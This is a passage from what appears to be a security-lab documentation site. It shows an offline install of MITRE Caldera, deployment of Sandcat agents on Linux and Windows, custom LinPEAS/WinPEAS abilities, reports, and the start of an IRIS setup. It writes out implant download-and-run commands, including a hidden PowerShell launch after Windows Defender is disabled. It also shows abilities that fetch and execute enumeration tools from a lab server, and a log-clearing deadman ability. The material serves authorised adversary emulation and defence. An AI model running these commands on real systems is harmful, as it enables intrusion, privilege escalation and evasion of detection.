proceed.</p> <pre><code>#Example\nW: Download is performed unsandboxed as root as file '/home/cyber/python3-pip/build-essential_12.9ubuntu3_amd64.deb' couldn't be accessed by user '_apt'. - pkgAcquire::Run (13: Permission denied)\n</code></pre> <p>Download and install chrome (recommended for accessing Caldera web interface). Verify installation. </p> <pre><code>cd ~/caldera-offline/chrome\nwget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\nsudo dpkg -i *.deb\ngoogle-chrome --version\n</code></pre> <p>Download and install curl (required for agent to connect to Caldera server). Verify installation. </p> <pre><code>cd ~/caldera-offline/curl\nsudo apt-get download curl libc6 libcurl4t64 zlib1g\nsudo dpkg -i *.deb\ncurl --help\n</code></pre> <p>Download and install jq (required to view report in JSON format). Verify installation. </p> <pre><code>cd ~/caldera-offline/jq\nsudo apt-get download jq libc6 libjq1\nsudo dpkg -i *.deb\njq --help\n</code></pre> <p>Download upx. </p> <pre><code>cd ~/caldera-offline/upx\nwget https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-amd64_linux.tar.xz\n</code></pre> <p>Download and install Git (required to run <code>git clone</code>). Verify Git installation. </p> <pre><code>cd ~/caldera-offline/git\nsudo apt-get download git git-man liberror-perl\nsudo dpkg -i *.deb\ngit --version\n</code></pre> <p>Download and install Node.js Verify Node.js installation (required to run <code>npm</code> commands).</p> <pre><code>cd ~/caldera-offline/nodejs\nwget https://nodejs.org/dist/v22.13.1/node-v22.13.1-linux-x64.tar.xz\ntar -xvf node-v22.13.1-linux-x64.tar.xz\nsudo mv node-v22.13.1-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Download and install npm v11. Verify npm installation (required to run <code>npm</code> commands). </p> <pre><code>cd ~/caldera-offline/nodejs/npm\nwget https://registry.npmjs.org/npm/-/npm-11.0.0.tgz\ntar -xzf ~/caldera-offline/nodejs/npm/npm-11.0.0.tgz -C ~/caldera-offline/nodejs/npm --strip-components=1\nsudo /usr/local/nodejs/bin/node ~/caldera-offline/nodejs/npm/bin/npm-cli.js install -g npm\nsudo ln -s /usr/local/nodejs/bin/npm /usr/bin/npm\nnpm --version\n</code></pre> <p>Download and install Go. Verify Go installation (required to run <code>go</code> commands).</p> <pre><code>cd ~/caldera-offline/go\nwget https://go.dev/dl/go1.22.11.linux-amd64.tar.gz\nsudo tar -C /usr/local -xzf go1.22.11.linux-amd64.tar.gz\necho \"export PATH=\\$PATH:/usr/local/go/bin\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc\ngo version\n</code></pre> <p>Clone and prepare the Caldera repository's master branch. This process may take some time.</p> <pre><code>cd ~/caldera-offline\ngit clone https://github.com/mitre/caldera.git --recursive --branch master\n</code></pre> <p>Navigate <code>~/caldera-offline/caldera/plugins/atomic/data</code> and clone and prepare Atomic Red Team repository. This process may take some time.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/atomic/data\ngit clone --depth=1 https://github.com/redcanaryco/atomic-red-team.git\n</code></pre> <p>Fetch Golang dependencies for the Sandcat plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/sandcat/gocat\ngo mod tidy &amp;&amp; go mod download\ncp -r ~/go/pkg/mod ~/caldera-offline/go-modules\n</code></pre> <p>Fetch Node.js dependencies for the Magma plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/magma\nnpm install\nnpm run build\ncp -r node_modules ~/caldera-offline/node-modules\ncp -r dist ~/caldera-offline/magma-dist\n</code></pre> <p>Edit <code>caldera-offline/caldera/requirements.txt</code> with the following changes:</p> <pre><code>nano ~/caldera-offline/caldera/requirements.txt\n</code></pre> <pre><code>#Ubuntu 24.04\naiohttp-jinja2==1.5.1\naiohttp==3.10.8\naiohttp_session==2.12.0\naiohttp-security==0.4.0\naiohttp-apispec==3.0.0b2\njinja2==3.1.3\npyyaml==6.0.1\ncryptography==42.0.3 #ref issues\nwebsockets==11.0.3\nSphinx==7.1.2\nsphinx_rtd_theme==1.3.0\nmyst-parser==2.0.0\nmarshmallow==3.20.1\ndirhash==0.2.1\nmarshmallow-enum==1.5.1\nldap3==2.9.1\nlxml~=4.9.1  # debrief\nreportlab==4.0.4  # debrief\nrich==13.7.0\nsvglib==1.5.1  # debrief\nMarkdown==3.4.4  # training\ndnspython==2.4.2\nasyncssh==2.14.1\naioftp~=0.20.0\npackaging==24.2 #ref issues\ncroniter~=3.0.3\npyopenssl #ref issues\ndocker #resolve warning\n</code></pre> <p>Make a directory for Python dependencies and download all dependencies listed in the <code>requirements-dev.txt</code> and <code>requirements.txt</code> into the <code>python_deps</code> folder. </p> <pre><code>mkdir ~/caldera-offline/caldera/python_deps\npip3 download -r ~/caldera-offline/caldera/requirements-dev.txt --dest ~/caldera-offline/caldera/python_deps\npip3 download -r ~/caldera-offline/caldera/requirements.txt --dest ~/caldera-offline/caldera/python_deps\n</code></pre> <p>Compress all dependencies for transfer</p> <pre><code>cd ~/caldera-offline\ntar -czvf caldera-offline.tar.gz *\n</code></pre> <p>Transfer <code>caldera-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"caldera/caldera.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped Ubuntu VM, make a directory called caldera-offline and extract the transferred archive.</p> <pre><code>mkdir ~/caldera-offline &amp;&amp; cd ~/caldera-offline\ntar -xzvf ~/caldera-offline.tar.gz\n</code></pre> <p>Install the Python3-pip packages in the following order. Verify Python3-pip installation.</p> <pre><code>cd ~/caldera-offline/pip3\nsudo dpkg -i python3-minimal_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i python3_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i *.deb\npip3 --version\n</code></pre> <p>Install Google Chrome and verify installation.</p> <pre><code>cd ~/caldera-offline/chrome\nsudo dpkg -i *.deb\ngoogle-chrome --version\n</code></pre> <p>Install jq and verify installation.</p> <pre><code>cd ~/caldera-offline/jq\nsudo dpkg -i *.deb\njq --help\n</code></pre> <p>Install curl and verify installation.</p> <pre><code>cd ~/caldera-offline/curl\nsudo dpkg -i *.deb\ncurl --help\n</code></pre> <p>Install upx and verify installation.</p> <pre><code>cd ~/caldera-offline/upx\ntar -xvf upx-4.2.4-amd64_linux.tar.xz\nsudo mv upx-4.2.4-amd64_linux/upx /usr/local/bin/\nupx --version\n</code></pre> <p>Install Node.js and verify installation.</p> <pre><code>cd ~/caldera-offline/nodejs\ntar -xvf node-v22.13.1-linux-x64.tar.xz\nsudo mv node-v22.13.1-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\n</code></pre> <p>Install npm v11 and verify installation. This process may take some time.</p> <pre><code>cd ~/caldera-offline/nodejs/npm\ntar -xzf ~/caldera-offline/nodejs/npm/npm-11.0.0.tgz -C ~/caldera-offline/nodejs/npm --strip-components=1\nsudo /usr/local/nodejs/bin/node ~/caldera-offline/nodejs/npm/bin/npm-cli.js install -g --cache ~/caldera-offline/nodejs/npm-cache --no-audit --no-fund\nsudo ln -s /usr/local/nodejs/bin/npm /usr/bin/npm\nnpm --version\n</code></pre> <p>Install Go and verify installation.</p> <pre><code>cd ~/caldera-offline/go\nsudo tar -C /usr/local -xzf go1.22.11.linux-amd64.tar.gz\necho \"export PATH=\\$PATH:/usr/local/go/bin\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc\ngo version\n</code></pre> <p>Restore Golang Dependencies.</p> <pre><code>mkdir -p ~/go/pkg\ncp -r ~/caldera-offline/go-modules/* ~/go/pkg/mod\n</code></pre> <p>Restore Node.js dependencies for the Magma plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/magma\ncp -r ~/caldera-offline/node-modules node_modules\ncp -r ~/caldera-offline/magma-dist dist\n</code></pre> <p>This restores the Node.js dependencies and built Magma frontend, so you don\u2019t need to run <code>npm install</code> or <code>npm run build</code> again.</p> <p>Install all dependencies listed in requirements-dev.txt and requirements.txt.</p> <pre><code>cd ~/caldera-offline/caldera/\npip3 install -r requirements-dev.txt --no-index --find-links=./python_deps --break-system-packages\npip3 install -r requirements.txt --no-index --find-links=./python_deps --break-system-packages\n</code></pre> <p>Resolving Common Issues</p> <p>If you encounter this warning:</p> <pre><code>WARNING: The script safety is installed in '/home/cyber/.local/bin' which is not on PATH.\n</code></pre> <p>Add the directory to your <code>PATH</code>:</p> <pre><code>echo 'export PATH=\"$PATH:/home/cyber/.local/bin\"' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n</code></pre>"},{"location":"caldera/caldera.html#running-caldera","title":"Running Caldera","text":"<p>Navigate to the Caldera directory and launch the server. Wait until you see All systems ready. This process may take some time. </p> <pre><code>cd ~/caldera-offline/caldera\npython3 server.py --build --log DEBUG\n</code></pre> <pre><code>2025-02-01 04:46:20 INFO     Creating new secure config in conf/local.yml                                                                                        config_generator.py:55\n                    INFO                                                                                                                                         config_generator.py:30\n                             Log into Caldera with the following admin credentials:                                                                                                    \n                                 Red:                                                                                                                                                  \n                                     USERNAME: red                                                                                                                                     \n                                     PASSWORD: &lt;SNIP&gt;                                                                                             \n                                     API_TOKEN: &lt;SNIP&gt;\n                                 Blue:                                                                                                                                                 \n                                     USERNAME: blue                                                                                                                                    \n                                     PASSWORD: &lt;SNIP&gt;                                                                                             \n                                     API_TOKEN: &lt;SNIP&gt;                                                                                            \n                             To modify these values, edit the conf/local.yml file.   \n\n&lt;SNIP&gt;\n\n                    INFO     All systems ready.                                                                                                                           server.py:104\n\n \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\n\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\n \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n</code></pre> <p>The login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p> <p>At this stage, the web interface can only be accessed on the local machine hosting Caldera using the URL <code>http://localhost:8888</code>. While we can still open the web interface from another host on the same network using <code>http://&lt;IP address&gt;:8888</code>, the login page will be unresponsive.</p> <p>To resolve this issue, exit Caldera by pressing <code>Ctrl + C</code>.</p> <p>Edit <code>~/caldera-offline/caldera/conf/local.yml</code> with the following details:</p> <pre><code>nano ~/caldera-offline/caldera/conf/local.yml\n</code></pre> <pre><code>app.contact.http: http://SERVER-IP:8888\napp.frontend.api_base_url: http://SERVER-IP:8888\n</code></pre> <p>Edit <code>~/caldera-offline/caldera/plugins/magma/.env</code> with following details:</p> <pre><code>nano ~/caldera-offline/caldera/plugins/magma/.env\n</code></pre> <pre><code>VITE_CALDERA_URL=http://SERVER-IP:8888\n</code></pre> <p>Rebuild Caldera with following parameters. Wait until you see All systems ready. This process may take some time. </p> <pre><code>cd ~/caldera-offline/caldera\npython3 server.py --build --fresh --log DEBUG\n</code></pre> <p>The newly generated login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p> <p>From the Ubuntu VM, verify that you can log in to Caldera's web interface using the Red user\u2019s credentials, with the Caldera VM's IP address as the URL <code>http://&lt;SERVER-IP&gt;:8888</code>. Likewise, verify that you can log in to Caldera's web interface using the Red user\u2019s credentials and the Caldera VM\u2019s IP address from the Caldera VM itself.</p> <p></p> <p></p>"},{"location":"caldera/caldera.html#installing-caldera-online","title":"Installing Caldera Online","text":""},{"location":"caldera/caldera.html#quick-installation","title":"Quick Installation","text":"<p>You can set up Caldera swiftly by running the following four commands in your terminal:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive\ncd caldera\npip3 install -r requirements.txt\npython3 server.py --insecure --build\n</code></pre>"},{"location":"caldera/caldera.html#step-by-step-installation-guide","title":"Step-by-Step Installation Guide","text":"<ol> <li> <p>Clone the Repository:</p> <p>Use a recursive clone to include all plugins. It is recommended to specify a version or release (in <code>x.x.x</code> format). Cloning non-release branches, such as <code>master</code>, may introduce bugs. The basic command is:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x\n</code></pre> <p>For example, to clone version 5.0.0:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch 5.0.0\n</code></pre> </li> <li> <p>Navigate to the Directory:</p> <pre><code>cd caldera\n</code></pre> </li> <li> <p>Install Dependencies:</p> <pre><code>sudo pip3 install -r requirements.txt\n</code></pre> </li> <li> <p>Start the Server:</p> <p>Start the server with the <code>--build</code> argument on the first launch or when pulling updates:</p> <pre><code>python3 server.py --build\n</code></pre> <p>After launching, access the interface at <code>http://localhost:8888</code>. Log in with the default username <code>red</code> and the password found in the <code>conf/local.yml</code> file, generated when the server starts.</p> <p>To learn how to use Caldera, visit the Training plugin and complete the capture-the-flag style course.</p> </li> </ol>"},{"location":"caldera/caldera.html#docker-deployment","title":"Docker Deployment","text":"<p>Caldera can also be installed and run using Docker.</p> <ol> <li> <p>Clone the Repository:</p> <p>Clone the repository recursively, specifying the desired version/release:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x\n</code></pre> </li> <li> <p>Build the Docker Image:</p> <p>Navigate to the repository directory and build the Docker image.</p> <pre><code>cd caldera\ndocker build --build-arg WIN_BUILD=true . -t caldera:server\n</code></pre> <p>Alternatively, use the <code>docker-compose.yml</code> file:</p> <pre><code>docker-compose build\n</code></pre> </li> <li> <p>Run the Docker Container:</p> <p>Start the Caldera server, modifying port forwarding as necessary:</p> <pre><code>docker run -p 7010:7010 -p 7011:7011/udp -p 7012:7012 -p 8888:8888 caldera:server\n</code></pre> </li> <li> <p>Stop the Docker Container:</p> <p>To shut down the container gracefully, first identify the container ID:</p> <pre><code>docker ps\n</code></pre> <p>Then, send an interrupt signal:</p> <pre><code>docker kill --signal=SIGINT [container ID]\n</code></pre> </li> </ol>"},{"location":"caldera/caldera.html#introduction-to-caldera","title":"Introduction to Caldera","text":""},{"location":"caldera/caldera.html#configuring-abilities","title":"Configuring Abilities","text":"<p>Before deploying Caldera agents, we need to edit the abilities we will be using. In the web UI, under Campaigns, navigate to Abilities. Search for Check Python, then click on it.</p> <p></p> <p>Under Executor, enter following details for linux and windows and delete darwin (if it exists). Click Save. </p> Platform linux Executor sh Command python3 \u2014version Platform windows Executor psh Command python3 \u2014version <p></p> <p></p> <p>Search for Check Chrome, then repeat the similar process:</p> Platform windows Executor psh Command which google-chrome Platform linux Executor sh Command which google-chrome <p></p> <p></p> <p>Search for Check Go, then repeat the similar process:</p> Platform windows Executor psh Command which go Platform linux Executor sh Command which go <p></p> <p></p> <p>In the web GUI, under Campaigns, navigate to Agents and click Configuration.</p> <p></p> <p>The default implant name is 'splunkd', but you can change it. For Bootstrap Abilities, add 'Check Python', 'Check Go', and 'Check Chrome'. For Deadman Abilities, add 'Clear Logs'. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#deploying-linux-agent","title":"Deploying Linux Agent","text":"<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Linux'.  Copy and paste the commands into the Linux client.</p> <p>For example:</p> <pre><code>server=\"http://10.0.0.100:8888\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download &gt; splunkd;\nchmod +x splunkd;\n./splunkd -server $server -group red -v\n</code></pre> <p></p> <p></p> <p>After running the commands on the Linux client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p> <p></p>"},{"location":"caldera/caldera.html#deploying-windows-agent","title":"Deploying Windows Agent","text":"<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Windows'. On Windows client, disable Windows Defender. Copy and paste the commands into the PowerShell terminal of the Windows client.</p> <p>For example:</p> <pre><code>$server=\"http://10.0.0.100:8888\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$data=$wc.DownloadData($url);\nget-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;\nrm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;\n</code></pre> <p></p> <p></p> <p>After running the commands on the Windows client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p> <p></p>"},{"location":"caldera/caldera.html#verifying-access-to-agents","title":"Verifying Access to Agents","text":"<p>Under Plugins, navigate to Access and select your Linux and Windows agents. You will see the actions defined in Bootstrap and Deadman Abilities completed on each client, along with their status (success or failed). </p> <p></p> <p></p>"},{"location":"caldera/caldera.html#creating-a-new-adversary-profile","title":"Creating a New Adversary Profile","text":"<p>Under Campaigns, navigate to Adversaries. Click 'New Profile', then edit the Adversary name and description (e.g., 'Red Haast Eagle'; 'This is our kill chain'). Click 'Done'.</p> <p></p> <p>Click Add Ability.</p> <p></p> <p>Search and select Check Python.</p> <p></p> <p>Click Check Python to Edit Ability.</p> <p></p> <p>Verify that executors for Linux and Windows are available, as configured previously.</p> <p>Add the Abilities for \u2018Check Go\u2019 and 'Check Chrome'. Repeat the process as needed. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#creating-custom-abilities","title":"Creating Custom Abilities","text":"<p>Navigate to abilities and click Create an Ability.</p> <p></p> <p>Put following details:</p> Name Run LinPEAS Description Run LinPEAS to enumerate host for privilege escalation. Tactic discovery Technique ID T1083 Technique Name File and Directory Discovery <p></p> <p>Click Add Executor and put following details and click Create:</p> Platform linux Executor sh Command wget http://10.0.0.100:8000/linpeas.sh -O /dev/shm/linpeas.sh; sh /dev/shm/linpeas.sh Timeout 300 Cleanup rm -rf /dev/shm/linpeas.sh <p></p> <p>Repeat the process for Creating an ability for winPEAS.</p> Name Run WinPEAS Description Run WinPEAS to enumerate host for privilege escalation. Tactic discovery Technique ID T1083 Technique Name File and Directory Discovery <p></p> <p>Add windows executor with following details and click Create:</p> Platform windows Executor psh Command Invoke-WebRequest -Uri \"http://10.0.0.100:8000/winpeas.exe\" -OutFile \"C:\\Windows\\Temp\\winpeas.exe\"; Start-Process -FilePath \"C:\\Windows\\Temp\\winpeas.exe\" -NoNewWindow -Wait Tee-Object -FilePath \"C:\\Windows\\Temp\\notes.txt\" Timeout 300 Cleanup Remove-Item -Path \"C:\\Windows\\Temp\\winpeas.exe\" -Force <p></p>"},{"location":"caldera/caldera.html#downloading-linpeas-and-winpeas","title":"Downloading LinPEAS and WinPEAS","text":"<p>Since we configured our agents to download LinPEAS and WinPEAS from the Caldera VM\u2019s web server (10.0.0.100), we need to download the tools and host them on a web server. On the Caldera VM, connect to the internet and download LinPEAS. Then, modify its permissions to allow execution by running the following commands:</p> <pre><code>cd ~\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n</code></pre> <p>Download WinPEAS and output it as <code>winpeas.exe</code>:</p> <pre><code>cd ~\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -O winpeas.exe\n</code></pre> <p>Start a Python web server to serve the downloaded tools:</p> <pre><code>python3 -m http.server\n</code></pre> <p></p>"},{"location":"caldera/caldera.html#adding-custom-abilities","title":"Adding Custom Abilities","text":"<p>Navigate to Adversaries and add the \u2018Run LinPEAS\u2019 and \u2018Run WinPEAS\u2019 abilities to your Adversary profile. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#creating-an-operation","title":"Creating an Operation","text":"<p>Navigate to Operations and click \u2018New Operation.\u2019</p> <p></p> <p>Name the operation and select your newly created adversary profile. The default setting for obfuscators is plain-text, but other options, such as Base64, are available. Click Start.</p> <p></p> <p>The operation will start and execute the abilities we configured on the Linux and Windows agents. Wait until the operation returns a status for all abilities. This process may take some time. </p> <p></p> <p></p>"},{"location":"caldera/caldera.html#adding-a-manual-command","title":"Adding a Manual Command","text":"<p>To add a manual command, click Manual Command, select the agent, choose the executor, and enter the command. Click Add Cimmand.</p> <p>For example, to view the output of LinPEAS on an Ubuntu agent using sh, enter the following command:</p> <pre><code>cat /dev/shm/linpeas.out\n</code></pre> <p></p> <p></p>"},{"location":"caldera/caldera.html#generating-an-operation-report-json","title":"Generating an Operation Report (JSON)","text":"<p>The \"Run LinPEAS\" and \"Run WinPEAS\" abilities cause an error when generating a full JSON report, as the report contains a null value. For demonstration purposes, an adversary profile named \"Red Haast Eagle v2\" has been created, excluding both abilities. Additionally, a new operation called \"Cyber Defence Kit v2\" has been created and successfully completed using the Red Haast Eagle v2 adversary profile to demonstrate the functionality of downloading an operation report in JSON format. Navigate to operations, select Cyber Defence Kit v2 and click Download Report. </p> <p></p> <p></p> <p>You can include agent output unless it contains sensitive data. Reports can be downloaded in JSON (Full Report), Event Logs, or CSV format. Select Full Report and click Download.</p> <p></p> <p>Use the jq to view to JSON report by running:</p> <pre><code>cat 'Cyber Defence Kit_report.json' | jq . | less\n</code></pre> <p>Search for chrome by running:</p> <pre><code>/chrome\n</code></pre> <p></p> <p></p>"},{"location":"caldera/caldera.html#generating-a-pdf-report","title":"Generating a PDF Report","text":"<p>The debrief plugin provides a centralised view of campaign analytics, operation metadata, visuals, techniques, tactics, and discovered facts. Navigate to Debrief under Plugins and select your newly created operation. Click Download PDF Report.</p> <p></p> <p>Select Report Sections that you want to include, then click Download.</p> <p></p> <p>This generates a well-formatted PDF report.</p> <p></p>"},{"location":"caldera/caldera.html#generating-a-layer-for-mitre-attck-navigator","title":"Generating a Layer for MITRE ATT&amp;CK Navigator","text":"<p>For demonstration purposes, the internet has been connected temporarily to access MITRE ATT&amp;CK Navigator. There is a way to host MITRE ATT&amp;CK Navigator in an air-gapped environment, which will be covered in a separate section later. </p> <p>Click Compass plugin. Select your newly created adversary profile and click Generate Layer. This will automatically download <code>layer.json</code> file. </p> <p></p> <p>Click Open Existing Layer, then select Upload from Local. Choose layer.json and dismiss the warning for an outdated layer.</p> <p></p> <p></p> <p>This highlights the discovery techniques in ATT&amp;CK Navigator used by our newly created adversary profile.</p> <p></p>"},{"location":"caldera/caldera.html#references","title":"References","text":"<ul> <li>https://github.com/mitre/caldera</li> <li>https://caldera.mitre.org/</li> <li>https://caldera.readthedocs.io/en/latest/index.html</li> <li>https://www.youtube.com/watch?v=ZSDhDV48DUs&amp;list=PLA3BVzhXP1c0DwPORcVdjpEukfRmgcsOk</li> <li>https://youtu.be/Z9QdgD8dG24?si=U0mLaJk9a0DSBkWY</li> </ul>"},{"location":"iris/iris.html","title":"IRIS","text":""},{"location":"iris/iris.html#iris","title":"IRIS","text":"<p>IRIS is a digital platform built for collaboration among incident response analysts, enabling them to work together on detailed technical investigations. It can be set up on a standalone server or used as a portable application, making it suitable for on-the-go investigations in locations without internet access.</p>"},{"location":"iris/iris.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on a Windows Virtual Machine (VM) using Kali Linux in a safe and controlled environment. Both IRIS and Splunk Enterprise were installed on an Ubuntu VM.</p> <p>Note: Do not attempt to replicate the attack simulation demonstrated here unless you are properly trained and it is conducted in a secure and authorised manner. Unauthorised attack simulation can result in legal consequences and unintended damage to systems. Always ensure such activities are performed by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Iris Ubuntu 22.04 LTS IRIS 10.0.0.50 Splunk Ubuntu 22.04 LTS Splunk Enterprise 10.0.0.120 WS2019 Windows Server 2019 Splunk Universal Forwarder, Domain Controller 10.0.0.140 Kali Kali Linux 2024.2 Attacker machine 10.0.0.29 <p></p>"},{"location":"iris/iris.html#installing-iris-in-an-air-gapped-environment-ubuntu","title":"Installing IRIS in an Air-gapped Environment (Ubuntu)","text":"<p>These instructions cover downloading, transferring, and installing Docker Engine and IRIS in an air-gapped environment for Ubuntu 22.04.4 LTS. </p> <p>Preparing the Folder Structure</p> <p>On an internet-connected machine, create a structured directory</p> <pre><code>mkdir -p ~/iris-offline/{docker,docker-images}\n</code></pre> <p>Navigate to <code>~/iris-offline/docker</code> and download Docker Engine and dependencies.</p> <pre><code>curl -L https://get.docker.com | sh\n</code></pre> <p>Alternatively, you can run the following commands:</p> <pre><code>cd ~/iris-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.22.04~jammy_amd64.deb\n</code></pre> <p>Install the\u00a0<code>.deb</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>sudo dpkg -i *\n</code></pre> <p>Run <code>sudo service docker start</code></p> <pre><code>sudo service docker start\n</code></pre> <p>Run the following command to add your user to the <code>docker</code> group:</p> <pre><code>sudo usermod -aG docker $(whoami)\n</code></pre> <p>Reload the group membership for your current session with the following command:</p> <pre><code>newgrp docker\n</code></pre> <p>Check if you can run Docker commands without <code>sudo</code>:</p> <pre><code>docker ps\n</code></pre> <p>Clone the IRIS GitHub repository as a zip archive from the IRIS GitHub page. </p> <pre><code>cd ~/iris-offline\nsudo apt update\nsudo apt install git\ngit clone https://github.com/dfir-iris/iris-web.git\ncd iris-web\n</code></pre> <p>Check out the latest\u00a0non-beta\u00a0tagged version:</p> <pre><code>git checkout v2.4.20\n</code></pre> <p>Note: If you are working in an air-gapped environment where Git is not installed, skip this step and ensure that the contents of the <code>.env</code> file match those of the <code>.env.model</code> file.</p> <p>Copy the environment file</p> <pre><code>cp .env.model .env\n</code></pre> <p>Note: The default configuration is suitable for testing only. To configure IRIS for production, see the\u00a0configuration section. Pull all required Docker images on a system with internet access:</p> <pre><code>docker compose pull \n</code></pre> <p>Verify that Docker images have been pulled successfully:</p> <pre><code>docker images\n</code></pre> <pre><code>REPOSITORY                           TAG                   IMAGE ID       CREATED        SIZE\nghcr.io/dfir-iris/iriswebapp_app     latest                964d171dbb2b   4 days ago     1.27GB\nghcr.io/dfir-iris/iriswebapp_nginx   latest                eec0b38cb17d   4 days ago     211MB\nghcr.io/dfir-iris/iriswebapp_db      latest                9795f95185ef   4 days ago     266MB\nrabbitmq                             3-management-alpine   e9a8d679cd6f   2 months ago   178MB\n</code></pre> <p>After pulling the images, save them as <code>.tar</code> files in the <code>~/docker-images</code> folder.</p> <pre><code>cd ~/iris-offline/docker-images\ndocker save -o iris_db.tar ghcr.io/dfir-iris/iriswebapp_db:latest\ndocker save -o iris_app.tar ghcr.io/dfir-iris/iriswebapp_app:latest\ndocker save -o iris_nginx.tar ghcr.io/dfir-iris/iriswebapp_nginx:latest\ndocker save -o rabbitmq.tar rabbitmq:3-management-alpine\n</code></pre> <p>Compress <code>iris-offline</code> for transfer</p> <pre><code>cd ~/iris-offline\ntar -czvf iris-offline.tar.gz *\n</code></pre> <p>Transfer <code>iris-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p> <p>Installing IRIS in the Air-Gapped Environment</p> 